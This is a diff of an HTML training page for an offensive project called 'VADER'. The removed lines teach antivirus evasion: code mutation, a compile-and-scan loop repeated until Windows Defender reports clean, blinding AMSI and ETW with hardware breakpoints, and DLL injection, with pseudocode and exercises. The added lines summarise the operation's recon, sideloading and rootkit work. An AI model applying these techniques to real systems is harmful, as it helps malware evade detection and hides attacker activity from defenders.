-for (int i = 0; i &lt; 3; i++) _jnk += i * 7;</code></pre>
-
-  <p><strong>Caution:</strong> Too much junk looks suspicious to ML. A few strategic insertions are better than filling the binary with noise.</p>
-
-  <h3>Technique 4: Compiler Flag Variation</h3>
-
-  <p>Different optimisation levels produce different machine code for the same source:</p>
-
-<pre><code>/O1  -> Minimise size (current VADER default)
-/O2  -> Maximise speed
-/Ox  -> Full optimisation
-/Od  -> No optimisation (debug)</code></pre>
-
-  <p>Switching from <code>/O1</code> to <code>/O2</code> changes:</p>
-  <ul>
-    <li>Instruction selection (different opcodes for same operation)</li>
-    <li>Register allocation (different registers used)</li>
-    <li>Function inlining (some functions get inlined or not)</li>
-    <li>Loop unrolling (different loop structures)</li>
-  </ul>
-
-  <p>The result is a binary with different bytes, different structure, different hash &mdash; from the same source code.</p>
-
-  <h3>Technique 5: String Encoding Variation</h3>
-
-  <p>Instead of single-byte <a class="xref" href="#learn-ch3">XOR</a>, use different encoding schemes:</p>
-
-  <ul>
-    <li><strong>Multi-byte XOR:</strong> Key is 4+ bytes. Pattern repeats less.</li>
-    <li><strong>ADD/SUB encoding:</strong> <code>encoded[i] = plain[i] + key</code> instead of XOR.</li>
-    <li><strong>Stack strings:</strong> Build the string character by character with MOV instructions. No encoded array at all.</li>
-    <li><strong>Hash-based resolution:</strong> Don't store API names. Hash them. At runtime, walk the PEB/export table and compare hashes. The string never exists in the binary.</li>
-  </ul>
-
-  <p><strong>Stack strings example (conceptual):</strong></p>
-
-<pre><code>char buf[16];
-buf[0] = 'C'; buf[1] = 'r'; buf[2] = 'e'; buf[3] = 'a';
-buf[4] = 't'; buf[5] = 'e'; buf[6] = 'F'; buf[7] = 'i';
-buf[8] = 'l'; buf[9] = 'e'; buf[10] = 'W'; buf[11] = '\0';</code></pre>
-
-  <p>The compiler turns each assignment into a MOV instruction. No contiguous string in the binary.</p>
-
-  <div class="exercise">
-    <h4>Exercise 4.1: Multi-Technique Mutation</h4>
-    <p>Take any VADER source file. Apply ALL FIVE techniques:</p>
-    <ol>
-      <li>Rename all meaningful variable/function names</li>
-      <li>Reorder the functions</li>
-      <li>Add 2-3 junk code blocks</li>
-      <li>Compile with <code>/O2</code> instead of <code>/O1</code></li>
-      <li>Use a new <a class="xref" href="#learn-ch3">XOR</a> key</li>
-    </ol>
-    <p>Compare the binary hashes before and after. Run both through <code>scan_all.py</code>.</p>
+<!-- ════════════ SECTION 5: METHODOLOGY ════════════ -->
+<section id="methodology">
+  <div class="section-header">
+    <div class="section-number">Section 05</div>
+    <h2 class="section-title">Methodology</h2>
   </div>
 
-  <hr>
+  <div class="method-grid">
+    <div class="method-card">
+      <div class="method-card-title">Service &amp; DLL Scanner</div>
+      <p>Automated PowerShell scanner (<code>vader_recon.ps1</code>) with built-in PE import parser. Enumerates all SYSTEM services, parses PE import tables (normal + delay-load), cross-references against KnownDLLs and disk to identify phantom DLLs plantable via user-writable PATH directories.</p>
+    </div>
+    <div class="method-card">
+      <div class="method-card-title">DLL Sideload Testing</div>
+      <p><strong>6 proxy variants</strong> (v1&ndash;v6) tested iteratively. Progressed from plaintext exports through XOR-encoded lazy-init. Discovered manifest hardening, pivoted to binary replacement.</p>
+    </div>
+    <div class="method-card">
+      <div class="method-card-title">Defender Evasion Progression</div>
+      <p>Static evasion (XOR encoding) &rarr; Behavioral detection mapped &rarr; Hardware breakpoint approach developed. Each layer documented with detection signatures.</p>
+    </div>
+    <div class="method-card">
+      <div class="method-card-title">Iterative Approach</div>
+      <p>DLL sideload blocked by embedded manifest &rarr; pivoted to binary replacement. Defender ML caught proxy pattern &rarr; developed stealth variant (v6). Each failure produced a documented finding.</p>
+    </div>
+    <div class="method-card">
+      <div class="method-card-title">Reconnaissance Package</div>
+      <p><code>vader_recon.ps1</code> &mdash; 20-section automated reconnaissance. Includes PE import parser for phantom DLL hunting (delay-load + normal imports), privesc quick checks (AlwaysInstallElevated, AppInit_DLLs, IFEO, token privileges), and auto-scored vector assessment with deploy command.</p>
+    </div>
+    <div class="method-card">
+      <div class="method-card-title">Prior Art Integration</div>
+      <p>30 findings from vader-toctou (Defender quarantine TOCTOU) fed directly into rootkit development. Architecture model of Defender's defense-in-depth guided all subsequent testing.</p>
+    </div>
+  </div>
+</section>
 
-  <!-- Chapter 5 -->
-  <h2 id="learn-ch5">Chapter 5: Building a Mutation Pipeline</h2>
-
-  <p>This chapter teaches you how to design (and eventually build) an automated mutation tool. The pipeline takes a source file, applies mutations, compiles, and verifies evasion.</p>
-
-  <h3>Architecture</h3>
-
-<pre><code>INPUT: source.c + current XOR key
-           |
-           v
-    +----------------+
-    | PARSE SOURCE   |  Extract: XOR arrays, key constant, function names
-    +-------+--------+
-            |
-            v
-    +----------------+
-    | MUTATE         |  Apply: new XOR key, rename symbols, reorder functions
-    +-------+--------+
-            |
-            v
-    +----------------+
-    | WRITE OUTPUT   |  Write mutated source to temp file
-    +-------+--------+
-            |
-            v
-    +----------------+
-    | COMPILE        |  cl.exe with current flags
-    +-------+--------+
-            |
-            v
-    +----------------+
-    | SCAN           |  MpCmdRun.exe -Scan -ScanType 3 -File &lt;binary&gt;
-    +-------+--------+
-            |
-            +-- CLEAN -> Done. Save the mutation parameters.
-            |
-            +-- DETECTED -> Loop back to MUTATE with different parameters.
-                           After N failures, escalate mutation depth.</code></pre>
-
-  <h3>Pseudocode: The Core Loop</h3>
-
-<pre><code>FUNCTION mutate_and_verify(source_path, output_name, max_attempts):
-    original_key = extract_xor_key(source_path)
-
-    FOR attempt IN 1 to max_attempts:
-        // Pick mutation parameters
-        new_key = random_byte(0x01, 0xFF, excluding=original_key)
-
-        // Level 1: XOR rotation only (fast, usually sufficient)
-        IF attempt &lt;= 3:
-            mutated = rotate_xor_key(source_path, original_key, new_key)
-
-        // Level 2: XOR + symbol rename (medium)
-        ELIF attempt &lt;= 6:
-            mutated = rotate_xor_key(source_path, original_key, new_key)
-            mutated = rename_symbols(mutated)
-
-        // Level 3: Full mutation (slow but thorough)
-        ELSE:
-            mutated = rotate_xor_key(source_path, original_key, new_key)
-            mutated = rename_symbols(mutated)
-            mutated = reorder_functions(mutated)
-            mutated = insert_junk(mutated)
-
-        // Compile
-        success = compile(mutated, output_name)
-        IF NOT success:
-            CONTINUE  // compilation error, try different mutations
-
-        // Scan
-        result = scan(output_name)
-        IF result == CLEAN:
-            LOG("Clean at attempt {attempt}, key=0x{new_key:02X}")
-            RETURN success, new_key, mutated
-
-    RETURN failure  // all attempts detected</code></pre>
-
-  <h3>Step 1: Parsing XOR Arrays (Exercise)</h3>
-
-  <p>The first building block is extracting XOR-encoded arrays from C source code. These look like:</p>
-
-<pre><code>unsigned char enc_funcname[] = {0x00, 0x2C, 0x32, 0x28, ...};</code></pre>
-
-  <div class="exercise">
-    <h4>Exercise 5.1: Parse XOR Arrays</h4>
-    <p>Write a Python function <code>find_xor_arrays(source_text)</code> that:</p>
-    <ul>
-      <li>Uses regex to find all <code>unsigned char</code> array initialisers with hex byte lists</li>
-      <li>Returns a list of: (variable_name, [byte_values], line_number)</li>
-      <li>Handles multi-line arrays</li>
-    </ul>
-    <p><strong>Hint:</strong> The regex pattern <code>unsigned\s+char\s+(\w+)\[\]\s*=\s*\{([^}]+)\}</code> gets you started.</p>
+<!-- ════════════ SECTION 6: DEFENSE ANALYSIS ════════════ -->
+<section id="defenses">
+  <div class="section-header">
+    <div class="section-number">Section 06</div>
+    <h2 class="section-title">Defense Analysis Summary</h2>
   </div>
 
-  <h3>Step 2: Decoding and Re-encoding (Exercise)</h3>
-
-  <div class="exercise">
-    <h4>Exercise 5.2: Decode and Re-encode</h4>
-    <p>Write a Python function <code>rotate_arrays(source_text, old_key, new_key)</code> that:</p>
-    <ul>
-      <li>Finds each XOR array (using your Exercise 5.1 function)</li>
-      <li>Decodes each byte: <code>original = encoded_byte ^ old_key</code></li>
-      <li>Re-encodes: <code>new_encoded = original ^ new_key</code></li>
-      <li>Replaces the array in the source text</li>
-      <li>Also replaces the <a class="xref" href="#learn-ch3">XOR</a> key constant definition</li>
-    </ul>
+  <div class="prose" style="margin-bottom: 1.5rem;">
+    <p>Every defense layer encountered during the operation, its current status, and the finding that documented the result.</p>
   </div>
-
-  <h3>Step 3: Compiling from Python (Exercise)</h3>
-
-  <div class="exercise">
-    <h4>Exercise 5.3: Compile from Python</h4>
-    <p>Write a Python function <code>compile_source(source_path, output_path, flags)</code> that:</p>
-    <ul>
-      <li>Calls <code>cl.exe</code> via subprocess</li>
-      <li>Handles the <code>vcvars64.bat</code> environment setup</li>
-      <li>Returns True/False for success/failure</li>
-      <li>Captures compiler output for error reporting</li>
-    </ul>
-    <p><strong>Key challenge:</strong> <code>vcvars64.bat</code> sets environment variables. You need to either:</p>
-    <ul>
-      <li>Run both commands in the same shell session</li>
-      <li>Or extract the environment from vcvars and pass it to cl.exe</li>
-    </ul>
-  </div>
-
-  <h3>Step 4: Scanning (Exercise)</h3>
-
-  <div class="exercise">
-    <h4>Exercise 5.4: Scan from Python</h4>
-    <p>Write a Python function <code>scan_binary(binary_path)</code> that:</p>
-    <ul>
-      <li>Copies the binary to a temp directory (don't scan in place &mdash; <a class="xref" href="#learn-ch1">Defender</a> may quarantine)</li>
-      <li>Runs <code>MpCmdRun.exe</code> with <code>-Scan -ScanType 3 -File &lt;temp_copy&gt; -DisableRemediation</code></li>
-      <li>Returns "CLEAN", "DETECTED", or "ERROR"</li>
-      <li>Cleans up the temp copy</li>
-    </ul>
-    <p><strong>Reference:</strong> <code>tests/scan_all.py</code> already does this. Study it.</p>
-  </div>
-
-  <h3>Step 5: The Complete Pipeline (Exercise)</h3>
-
-  <div class="exercise">
-    <h4>Exercise 5.5: Complete Mutation Pipeline</h4>
-    <p>Combine exercises 5.1-5.4 into a single script <code>mutate.py</code> that:</p>
-    <ol>
-      <li>Takes a source file and output name as arguments</li>
-      <li>Extracts current <a class="xref" href="#learn-ch3">XOR</a> key</li>
-      <li>Generates a new random key</li>
-      <li>Rotates all XOR arrays</li>
-      <li>Compiles</li>
-      <li>Scans</li>
-      <li>Reports result</li>
-      <li>If detected, tries again with a different key (up to N attempts)</li>
-    </ol>
-    <p><strong>Check your work:</strong></p>
-    <ul>
-      <li>Start with a CLEAN binary</li>
-      <li>Manually change its XOR key to something that gets detected (unlikely but possible)</li>
-      <li>Run your pipeline &mdash; it should iterate until it finds a clean key</li>
-      <li>More realistically: run it on a CLEAN binary and verify it stays clean after mutation</li>
-    </ul>
-  </div>
-
-  <hr>
-
-  <!-- ── PART 3 ── -->
-  <h1 class="part-header" id="learn-part3">Part 3: Process Injection</h1>
-  <div class="part-doctrine">ASF Principle 2: "See the paths, see what blocks you, find a substitute way." The <a class="xref" href="#learn-ch6" style="color:var(--muted)">dark room</a> works in its own process. The block: HWBP doesn't propagate to children. The substitute: inject the HWBP setup into the target process.</div>
-
-  <!-- Chapter 6 -->
-  <h2 id="learn-ch6">Chapter 6: Why Injection Is Needed</h2>
-
-  <h3>The Problem</h3>
-
-  <p>When <code>dark_room.exe</code> runs:</p>
-  <ol>
-    <li>It sets <a class="xref" href="#learn-ch7">DR0</a> = address of AmsiScanBuffer</li>
-    <li>It sets <a class="xref" href="#learn-ch7">DR1</a> = address of EtwEventWrite</li>
-    <li>It installs a VEH handler to catch the breakpoint exceptions</li>
-    <li><a class="xref" href="#learn-ch6">AMSI</a> and <a class="xref" href="#learn-ch6">ETW</a> are now blind &mdash; <strong>in this process only</strong></li>
-  </ol>
-
-  <p>If dark_room spawns PowerShell:</p>
-
-<pre><code>dark_room.exe  &lt;-  DR0/DR1 set, VEH installed, AMSI/ETW BLIND
-    |
-    +---> powershell.exe  &lt;-  DR0/DR1 NOT set, no VEH, AMSI/ETW ACTIVE</code></pre>
-
-  <p>Child processes do NOT inherit:</p>
-  <ul>
-    <li><a class="xref" href="#learn-ch7">Debug register</a> values (<a class="xref" href="#learn-ch7">DR0-DR7</a> are per-thread, reset on new process)</li>
-    <li>Vectored Exception Handlers (per-process registration)</li>
-  </ul>
-
-  <p>So PowerShell can still scan scripts and report telemetry. The <a class="xref" href="#learn-ch6">dark room</a> only covers the room you're standing in.</p>
-
-  <h3>The Solution</h3>
-
-  <p>Inject the <a class="xref" href="#learn-ch7">HWBP</a> setup into the target process. This means:</p>
-  <ol>
-    <li>Open the target process</li>
-    <li>Install a VEH handler inside it (so breakpoint exceptions are caught)</li>
-    <li>Set <a class="xref" href="#learn-ch7">DR0/DR1</a> on the target's threads (so breakpoints fire at the right addresses)</li>
-  </ol>
-
-  <p>After injection:</p>
-
-<pre><code>dark_room.exe  &lt;-  BLIND (own breakpoints)
-    |
-    +---> powershell.exe  &lt;-  BLIND (injected breakpoints + handler)</code></pre>
-
-  <hr>
-
-  <!-- Chapter 7 -->
-  <h2 id="learn-ch7">Chapter 7: Debug Registers &mdash; The Hardware Layer</h2>
-
-  <p>You already use <a class="xref" href="#learn-ch7">debug registers</a> in <code>dark_room.c</code>. This chapter goes deeper into how they actually work at the CPU level.</p>
-
-  <h3>The x64 Debug Register Set</h3>
-
-<pre><code>DR0:  Breakpoint 0 address    &lt;- VADER uses: AmsiScanBuffer
-DR1:  Breakpoint 1 address    &lt;- VADER uses: EtwEventWrite
-DR2:  Breakpoint 2 address    &lt;- Available (unused)
-DR3:  Breakpoint 3 address    &lt;- Available (unused)
-DR4:  Reserved (alias for DR6)
-DR5:  Reserved (alias for DR7)
-DR6:  Debug Status Register   &lt;- Which breakpoint fired
-DR7:  Debug Control Register  &lt;- Enable/disable, conditions, sizes</code></pre>
-
-  <h3>DR7 Bit Layout (Critical to Understand)</h3>
-
-  <p>DR7 is the control register. Its bits determine which breakpoints are active and how they trigger.</p>
-
-<pre><code>Bits 0-7:   Enable bits
-  Bit 0:  L0 -- Local enable for DR0 (set = active in current task)
-  Bit 1:  G0 -- Global enable for DR0
-  Bit 2:  L1 -- Local enable for DR1
-  Bit 3:  G1 -- Global enable for DR1
-  Bit 4:  L2 -- Local enable for DR2
-  Bit 5:  G2 -- Global enable for DR2
-  Bit 6:  L3 -- Local enable for DR3
-  Bit 7:  G3 -- Global enable for DR3
-
-Bits 16-31: Condition and size for each breakpoint
-  Bits 16-17: Condition for DR0
-  Bits 18-19: Size for DR0
-  Bits 20-21: Condition for DR1
-  Bits 22-23: Size for DR1
-  Bits 24-25: Condition for DR2
-  Bits 26-27: Size for DR2
-  Bits 28-29: Condition for DR3
-  Bits 30-31: Size for DR3
-
-Condition codes:
-  00 = Execute (break on execution -- what VADER uses)
-  01 = Write (break on data write)
-  10 = I/O (break on I/O access, rarely used)
-  11 = Read/Write (break on data read or write)
-
-Size codes (for execute breakpoints, must be 00):
-  00 = 1 byte
-  01 = 2 bytes
-  10 = 8 bytes (x64 only)
-  11 = 4 bytes</code></pre>
-
-  <h3>How VADER Sets DR7</h3>
-
-  <p>For VADER's use case (two execute breakpoints on DR0 and DR1):</p>
-
-<pre><code>DR7 needs:
-  Bit 0 = 1    (L0: enable DR0 locally)
-  Bit 2 = 1    (L1: enable DR1 locally)
-  Bits 16-17 = 00  (DR0 condition: execute)
-  Bits 18-19 = 00  (DR0 size: 1 byte)
-  Bits 20-21 = 00  (DR1 condition: execute)
-  Bits 22-23 = 00  (DR1 size: 1 byte)
-
-DR7 = 0x00000005  (bits 0 and 2 set, everything else 0)</code></pre>
-
-  <p>But in practice, you should preserve existing DR7 bits (other software might be using DR2/DR3):</p>
-
-<pre><code>new_dr7 = (old_dr7 &amp; ~0x000F0005)  // Clear our bits
-        | 0x00000005                // Set L0 and L1
-        // Condition and size bits stay 00 (execute, 1 byte) -- already zero</code></pre>
-
-  <div class="exercise">
-    <h4>Exercise 7.1: DR7 Calculation</h4>
-    <p>Calculate the DR7 value for these scenarios:</p>
-    <ol>
-      <li>One execute breakpoint on DR0 only</li>
-      <li>Two execute breakpoints on DR0 and DR1 (VADER's current setup)</li>
-      <li>Three execute breakpoints on DR0, DR1, and DR2</li>
-      <li>One execute breakpoint on DR0 and one data-write breakpoint on DR2 (4-byte watch)</li>
-    </ol>
-  </div>
-
-  <div class="exercise">
-    <h4>Exercise 7.2: Read dark_room.c</h4>
-    <p>Open <code>dark_room/dark_room_annotated.c</code> and find:</p>
-    <ol>
-      <li>Where DR7 is calculated</li>
-      <li>Where DR0 and DR1 are set</li>
-      <li>How the VEH handler determines which breakpoint fired</li>
-      <li>What the handler does when each breakpoint fires (what return value does it set?)</li>
-    </ol>
-  </div>
-
-  <hr>
-
-  <!-- Chapter 8 -->
-  <h2 id="learn-ch8">Chapter 8: Injection Techniques</h2>
-
-  <p>There are several ways to run code inside another process. Each has trade-offs.</p>
-
-  <h3>Technique 1: CreateRemoteThread</h3>
-
-  <p>The classic. Allocate memory in the target, write your code there, create a thread to execute it.</p>
-
-  <p><strong>Flow:</strong></p>
-
-<pre><code>YOUR PROCESS                              TARGET PROCESS
-    |                                          |
-    | OpenProcess(PROCESS_ALL_ACCESS, pid) --> |
-    |                                          |
-    | VirtualAllocEx(handle, size, RWX)  ----> | [memory allocated]
-    |                                          |
-    | WriteProcessMemory(handle, addr, code) > | [code written]
-    |                                          |
-    | CreateRemoteThread(handle, addr)  -----> | [thread starts]
-    |                                          | [your code runs]</code></pre>
-
-  <p><strong>Windows APIs involved:</strong></p>
-  <ul>
-    <li><code>OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID)</code> &mdash; Get a handle to the target</li>
-    <li><code>VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)</code> &mdash; Allocate memory inside target</li>
-    <li><code>WriteProcessMemory(hProcess, remoteAddr, localBuffer, size, NULL)</code> &mdash; Write code/data into allocated memory</li>
-    <li><code>CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, param, 0, NULL)</code> &mdash; Start a thread at the written code</li>
-  </ul>
-
-  <p><strong>Pros:</strong> Simple, well-documented, reliable.<br>
-  <strong>Cons:</strong> Heavily monitored by EDR/AV. The API call sequence (<code>VirtualAllocEx</code> + <code>WriteProcessMemory</code> + <code>CreateRemoteThread</code>) is a classic detection signature.</p>
-
-  <h3>Technique 2: APC Injection</h3>
-
-  <p>Queue an Asynchronous Procedure Call (APC) to a thread in the target. The APC runs when the thread enters an alertable wait state.</p>
-
-  <p><strong>Flow:</strong></p>
-
-<pre><code>YOUR PROCESS                              TARGET PROCESS
-    |                                          |
-    | OpenProcess + VirtualAllocEx + Write --> | [payload written]
-    |                                          |
-    | OpenThread(thread_id)  ----------------> |
-    |                                          |
-    | QueueUserAPC(remoteAddr, hThread, 0) --> | [APC queued]
-    |                                          |
-    | ... wait ...                             | [thread enters alertable wait]
-    |                                          | [APC fires]
-    |                                          | [your code runs]</code></pre>
-
-  <p><strong>Key API:</strong> <code>QueueUserAPC(pfnAPC, hThread, dwData)</code> &mdash; Queue a function to run on a specific thread</p>
-
-  <p><strong>Pros:</strong> No CreateRemoteThread call. Uses an existing thread.<br>
-  <strong>Cons:</strong> The target thread must enter an alertable wait (<code>SleepEx</code>, <code>WaitForSingleObjectEx</code>, etc.). If it never does, the APC never fires.</p>
-
-  <h3>Technique 3: Thread Context Manipulation</h3>
-
-  <p>Suspend a thread, modify its instruction pointer (RIP) to point at your code, resume. The thread "wakes up" executing your payload.</p>
-
-  <p><strong>Flow:</strong></p>
-
-<pre><code>YOUR PROCESS                              TARGET PROCESS
-    |                                          |
-    | VirtualAllocEx + WriteProcessMemory ---> | [payload written]
-    |                                          |
-    | SuspendThread(hThread)  ---------------> | [thread suspended]
-    |                                          |
-    | GetThreadContext(hThread, &amp;ctx)           |
-    | ctx.Rip = remotePayloadAddr              |
-    | SetThreadContext(hThread, &amp;ctx) -------> | [RIP modified]
-    |                                          |
-    | ResumeThread(hThread)  ----------------> | [thread resumes at payload]</code></pre>
-
-  <p><strong>Key APIs:</strong></p>
-  <ul>
-    <li><code>SuspendThread(hThread)</code> / <code>ResumeThread(hThread)</code> &mdash; Pause/resume</li>
-    <li><code>GetThreadContext(hThread, &amp;context)</code> &mdash; Read registers (including RIP, <a class="xref" href="#learn-ch7">DR0-DR7</a>)</li>
-    <li><code>SetThreadContext(hThread, &amp;context)</code> &mdash; Write registers</li>
-  </ul>
-
-  <p><strong>Pros:</strong> No new threads, no APC queue. Modifies existing execution flow.<br>
-  <strong>Cons:</strong> You must save and restore the original RIP, or the thread crashes after your code runs. More complex to implement correctly.</p>
-
-  <h3>Technique 4: SetThreadContext for Debug Registers Only</h3>
-
-  <p>This is a special case relevant to VADER. You don't need to inject shellcode &mdash; you just need to modify <a class="xref" href="#learn-ch7">DR0, DR1, and DR7</a>. <code>SetThreadContext</code> can do this without writing any code into the target.</p>
-
-  <p><strong>BUT:</strong> You still need a VEH handler in the target process. Without it, when the <a class="xref" href="#learn-ch7">hardware breakpoint</a> fires, the target gets an unhandled SINGLE_STEP exception and crashes.</p>
-
-  <p>So VADER's injector needs BOTH:</p>
-  <ol>
-    <li>Inject and register a VEH handler (requires code injection)</li>
-    <li>Set <a class="xref" href="#learn-ch7">DR0/DR1/DR7</a> (just <code>SetThreadContext</code>)</li>
-  </ol>
-
-  <div class="exercise">
-    <h4>Exercise 8.1: API Research</h4>
-    <p>Look up each of these on Microsoft's documentation (learn.microsoft.com):</p>
-    <ol>
-      <li><code>OpenProcess</code> &mdash; What access rights do you need? What's <code>PROCESS_ALL_ACCESS</code>?</li>
-      <li><code>VirtualAllocEx</code> &mdash; What's the difference between <code>MEM_COMMIT</code> and <code>MEM_RESERVE</code>? Why use both?</li>
-      <li><code>WriteProcessMemory</code> &mdash; What happens if the target address isn't writable?</li>
-      <li><code>CreateRemoteThread</code> &mdash; What does the <code>lpParameter</code> argument do?</li>
-      <li><code>GetThreadContext</code> / <code>SetThreadContext</code> &mdash; What flags control which register groups are read/written?</li>
-    </ol>
-  </div>
-
-  <div class="exercise">
-    <h4>Exercise 8.2: Thread Enumeration</h4>
-    <p>Before you can modify threads, you need to find them. Windows provides the Tool Help library:</p>
-    <p><strong>Key APIs:</strong></p>
-    <ul>
-      <li><code>CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)</code> &mdash; Snapshot all threads in the system</li>
-      <li><code>Thread32First(hSnapshot, &amp;te)</code> / <code>Thread32Next(hSnapshot, &amp;te)</code> &mdash; Iterate threads</li>
-      <li><code>THREADENTRY32.th32OwnerProcessID</code> &mdash; Which process owns this thread</li>
-    </ul>
-    <p><strong>Exercise:</strong> Write pseudocode for a function <code>enumerate_threads(target_pid)</code> that returns a list of thread IDs belonging to a specific process.</p>
-  </div>
-
-  <hr>
-
-  <!-- Chapter 9 -->
-  <h2 id="learn-ch9">Chapter 9: Designing VADER's Injector</h2>
-
-  <p>This chapter pulls everything together into the design for VADER's Phase 4.</p>
-
-  <h3>What VADER's Injector Needs to Do</h3>
-
-<pre><code>FUNCTION vader_inject(target_pid):
-
-    STEP 1: Resolve target addresses
-        Find AmsiScanBuffer address in target process
-        Find EtwEventWrite address in target process
-        (These may be at different addresses than in our process
-         due to ASLR -- but DLLs shared across processes are
-         mapped at the same base, so usually the same)
-
-    STEP 2: Inject VEH handler
-        Allocate RWX memory in target (VirtualAllocEx)
-        Write the handler function code (WriteProcessMemory)
-        Register it (call AddVectoredExceptionHandler remotely)
-
-    STEP 3: Set hardware breakpoints on all threads
-        FOR EACH thread IN enumerate_threads(target_pid):
-            SuspendThread(thread)
-            GetThreadContext(thread)  // with CONTEXT_DEBUG_REGISTERS
-            Set DR0 = AmsiScanBuffer address
-            Set DR1 = EtwEventWrite address
-            Set DR7 = enable DR0 + DR1 as execute breakpoints
-            SetThreadContext(thread)
-            ResumeThread(thread)
-
-    STEP 4: Verify
-        (Optional) Trigger AMSI in target to confirm bypass works</code></pre>
-
-  <h3>The ASLR Question</h3>
-
-  <p>ASLR (Address Space Layout Randomisation) randomises where DLLs load in memory. But on Windows, DLLs that are already loaded when a process starts share the same base address across all processes (because they're memory-mapped from the same file).</p>
-
-  <p>This means:</p>
-  <ul>
-    <li><code>ntdll.dll</code> loads at the same address in every process on the same boot</li>
-    <li><code>amsi.dll</code> loads at the same address in every process that loads it</li>
-  </ul>
-
-  <p>So the address of <code>AmsiScanBuffer</code> in <code>dark_room.exe</code> is the SAME as in <code>powershell.exe</code> (on the same boot). After reboot, it changes, but it's the same everywhere within a session.</p>
-
-  <p><strong>Implication:</strong> You can resolve the address in your own process and use it for the target.</p>
-
-  <h3>The VEH Handler Problem</h3>
-
-  <p>The hardest part of VADER's injector is installing the VEH handler remotely. The handler needs to:</p>
-  <ol>
-    <li>Check if the exception is SINGLE_STEP (<code>STATUS_SINGLE_STEP = 0x80000004</code>)</li>
-    <li>Check if RIP matches <a class="xref" href="#learn-ch7">DR0</a> (AmsiScanBuffer) or <a class="xref" href="#learn-ch7">DR1</a> (EtwEventWrite)</li>
-    <li>Set the return value (RAX) appropriately</li>
-    <li>Clear the Resume Flag in EFLAGS</li>
-    <li>Return <code>EXCEPTION_CONTINUE_EXECUTION</code></li>
-  </ol>
-
-  <p>This is machine code that must run inside the target. You have two options:</p>
-
-  <p><strong>Option A: <a class="xref" href="#learn-ch8">DLL injection</a> + VEH registration</strong><br>
-  Write the handler as a DLL. Inject the DLL (via <code>LoadLibrary</code> + <code>CreateRemoteThread</code>). The DLL's <code>DllMain</code> registers the VEH handler and returns. Cleanest approach.</p>
-
-  <p><strong>Option B: Shellcode injection</strong><br>
-  Write the handler as position-independent code (shellcode). Write it into the target. Create a remote thread that calls <code>AddVectoredExceptionHandler</code> with a pointer to your shellcode. More complex but avoids dropping a DLL to disk.</p>
-
-  <h3>Architecture Decision</h3>
-
-  <p>For VADER, <strong>Option A (<a class="xref" href="#learn-ch8">DLL injection</a>)</strong> is recommended because:</p>
-  <ul>
-    <li>The VEH handler code is already written (<code>dark_room.c</code>'s handler)</li>
-    <li>Compiling it as a DLL is trivial</li>
-    <li><code>LoadLibrary</code>-based injection is well-understood</li>
-    <li>The DLL can also set the <a class="xref" href="#learn-ch7">debug registers</a> in <code>DllMain</code>, combining Steps 2 and 3</li>
-  </ul>
-
-  <p><strong>The injection DLL would:</strong></p>
-
-<pre><code>DllMain(DLL_PROCESS_ATTACH):
-    1. Resolve AmsiScanBuffer address
-    2. Resolve EtwEventWrite address
-    3. Register VEH handler (AddVectoredExceptionHandler)
-    4. Set DR0, DR1, DR7 on the current thread
-    5. Return TRUE</code></pre>
-
-  <p>Then the injector just needs to force-load this DLL into the target process.</p>
-
-  <h3>Classic DLL Injection Flow (Pseudocode)</h3>
-
-<pre><code>FUNCTION inject_dll(target_pid, dll_path):
-
-    // Open target process
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
-
-    // Allocate memory for the DLL path string
-    path_len = length(dll_path) + 1  // include null terminator
-    remote_path = VirtualAllocEx(hProcess, NULL, path_len,
-                                 MEM_COMMIT | MEM_RESERVE,
-                                 PAGE_READWRITE)
-
-    // Write the DLL path into target's memory
-    WriteProcessMemory(hProcess, remote_path, dll_path, path_len, NULL)
-
-    // Get the address of LoadLibraryA in kernel32.dll
-    // (Same address in all processes -- shared DLL)
-    hKernel32 = GetModuleHandle("kernel32.dll")
-    pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA")
-
-    // Create a remote thread that calls LoadLibrary(our_dll_path)
-    hThread = CreateRemoteThread(hProcess, NULL, 0,
-                                  pLoadLibrary, remote_path,
-                                  0, NULL)
-
-    // Wait for the DLL to load
-    WaitForSingleObject(hThread, INFINITE)
-
-    // Cleanup
-    VirtualFreeEx(hProcess, remote_path, 0, MEM_RELEASE)
-    CloseHandle(hThread)
-    CloseHandle(hProcess)</code></pre>
-
-  <p>When this runs, the target process calls <code>LoadLibrary("C:\\path\\to\\vader_inject.dll")</code>, which loads the DLL, which triggers <code>DllMain</code>, which sets up the <a class="xref" href="#learn-ch7">HWBP</a> + VEH. The target process is now blind.</p>
-
-  <div class="exercise">
-    <h4>Exercise 9.1: Design the Injection DLL</h4>
-    <p>Based on <code>dark_room_annotated.c</code>, design (on paper or in pseudocode) what <code>vader_inject.dll</code> would contain:</p>
-    <ol>
-      <li>What goes in <code>DllMain</code>?</li>
-      <li>What's the VEH handler function?</li>
-      <li>How does it resolve <code>AmsiScanBuffer</code> if <code>amsi.dll</code> isn't loaded yet in the target?</li>
-      <li>What if the target process creates new threads AFTER injection? (Hint: new threads don't inherit DR values)</li>
-    </ol>
-  </div>
-
-  <div class="exercise">
-    <h4>Exercise 9.2: Design the Injector</h4>
-    <p>Design the injector program (<code>vader_inject.exe</code>) that:</p>
-    <ol>
-      <li>Takes a target PID as command-line argument</li>
-      <li>Opens the target process</li>
-      <li>Injects the DLL using the <code>LoadLibrary</code> technique</li>
-      <li>Verifies the injection succeeded</li>
-      <li>Reports result</li>
-    </ol>
-    <p>What error conditions should it handle? What happens if <code>OpenProcess</code> fails (insufficient privileges)?</p>
-  </div>
-
-  <div class="exercise">
-    <h4>Exercise 9.3: The New Thread Problem</h4>
-    <p>When a process creates a new thread after injection, that thread has clean <a class="xref" href="#learn-ch7">DR0-DR7</a> (all zeros). The VEH handler is still registered (process-wide), but no breakpoints will fire on the new thread.</p>
-    <p><strong>Design challenge:</strong> How would you ensure new threads also get the breakpoints set? Research:</p>
-    <ul>
-      <li><code>NtSetInformationThread</code> with <code>ThreadHideFromDebugger</code></li>
-      <li>Thread creation callbacks (not available from user mode)</li>
-      <li>Hooking <code>NtCreateThread</code> / <code>NtCreateThreadEx</code></li>
-      <li>Periodic thread enumeration + <code>SetThreadContext</code></li>
-    </ul>
-    <p>There's no perfect solution &mdash; each has trade-offs. Think about which fits VADER's use case best.</p>
-  </div>
-
